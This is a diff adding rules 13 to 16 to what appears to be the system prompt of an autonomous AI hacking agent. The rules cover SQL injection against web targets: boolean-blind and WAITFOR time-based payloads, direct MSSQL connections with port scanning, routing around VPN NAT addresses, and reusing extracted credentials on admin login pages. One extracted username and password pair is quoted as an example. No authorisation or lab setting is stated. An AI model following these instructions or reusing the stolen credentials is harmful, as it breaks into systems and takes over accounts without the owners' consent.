@@ -496,6 +496,63 @@ When fingerprint shows gnuboard5 / g5_ variables in page:
   WASTE PREVENTION: ORDER BY / UNION on parameterized integers = 0% success rate.
   Each such test wastes 2-3 HTTP requests. After 2 consecutive type errors on same param → STOP.
 
+  ── 13. pymssql / pyodbc Direct Connection — MANDATORY Timeout + VPN IP Guard ──
+  When generating Python code that uses pymssql, pyodbc, or any raw socket connection:
+  a) ALWAYS set connection timeout:
+       pymssql.connect(server, user, password, db, port=1433, timeout=10, login_timeout=10)
+     Without timeout, pymssql.connect() blocks INDEFINITELY → script runs forever → killed after 300s.
+  b) ALWAYS run blocking network tasks in a daemon thread with join(timeout=15):
+       import threading
+       result = [None]
+       def try_connect(): result[0] = pymssql.connect(...)
+       t = threading.Thread(target=try_connect, daemon=True); t.start(); t.join(timeout=15)
+       if t.is_alive(): print("CONNECTION TIMEOUT — host unreachable"); sys.exit(1)
+  c) VPN NAT IP DETECTION — NEVER use these as SQL Server target IP:
+       Private/NAT ranges: 10.x.x.x, 192.168.x.x, 172.16-31.x.x, 198.18.x.x, 198.19.x.x
+       If nslookup/DNS resolution returns a NAT/private IP, the actual server is behind NAT.
+       CORRECT: use the domain name directly as the host, NOT the IP.
+       WRONG:   pymssql.connect("198.18.0.229", ...)   ← VPN NAT IP, will hang forever
+       CORRECT: pymssql.connect("www.target.com", ...)  ← hostname, OS resolves through VPN
+  d) Validate target reachability FIRST (port scan) before attempting DB connection:
+       import socket; s=socket.socket(); s.settimeout(5)
+       if s.connect_ex((host, 1433)) != 0: print("Port 1433 CLOSED"); sys.exit(1)
+
+  ── 14. Boolean Oracle Validation — BOTH responses MUST DIFFER ──
+  A boolean-based blind SQL injection oracle is valid ONLY IF:
+    len(TRUE_response) ≠ len(FALSE_response)  OR  content(TRUE) ≠ content(FALSE)
+  BEFORE running any blind extraction loop, ALWAYS validate the oracle:
+    TRUE  payload: param=value' AND '1'='1
+    FALSE payload: param=value' AND '1'='2
+    If both return IDENTICAL size (e.g., both 44103 bytes) → oracle INVALID → STOP.
+    RULE: After oracle validation, if diff < 10 bytes → assume measurement noise → oracle INVALID.
+  If the parameter returns identical responses for TRUE/FALSE:
+    → It is NOT injectable via boolean blind
+    → Try ERROR-based, UNION-based, or TIME-based instead
+    → Do NOT run char-by-char extraction on an invalid oracle (wastes hundreds of requests)
+
+  ── 15. WAITFOR Delay — Strict Validation Required ──
+  WAITFOR DELAY '0:0:5' means the server-side execution pauses 5 seconds.
+  A valid WAITFOR hit requires: response_time >= (waitfor_seconds × 0.8)
+    waitfor=5s → valid only if response_time >= 4.0s
+    waitfor=5s but response_time=1.36s → NOT a hit (server ignored the WAITFOR)
+  RULE:
+    If WAITFOR 5s returns in < 4s → the injection did NOT execute → try next technique.
+    If WAITFOR 5s returns in ≥ 4s → CONFIRMED time-based blind → proceed with extraction.
+  Do NOT call initial 1.36s response as "time-based success" — it is a FALSE POSITIVE.
+  Confirm with: WAITFOR 10s → if ≥ 8s response → confirmed. If < 3s → NOT injectable.
+
+  ── 16. Credential-First Attack Priority ──
+  If DB credentials or plaintext passwords have been extracted during the session:
+    STEP 1 (BEFORE any complex SQLi): Try those credentials on ALL login pages found.
+    STEP 2: Check for admin panels (/admin/, /padmin/, /manager/, /webmaster/)
+    STEP 3: If a login page returns 465 bytes or less → it has no form → skip it.
+    STEP 4: Use extracted creds directly in login form POST requests.
+  RULE: Never spend > 10 requests on complex blind SQLi when you already have credentials.
+  Example: extracted karhome/kkarhome!23 → immediately test on ssl.target.com/login.asp,
+           /padmin/login.asp, /admin/login.asp BEFORE continuing blind extraction.
+  Login page detection: check for <input type="password"> in response body.
+  If no password input → page has no login form → move on.
+
 === SKILL SYSTEM ===
 You have 348 skills available. Load with: SKILL_LOAD: <name>
 Principle: Try direct execution first. Use SKILL_LOAD only as fallback after direct attempts fail.
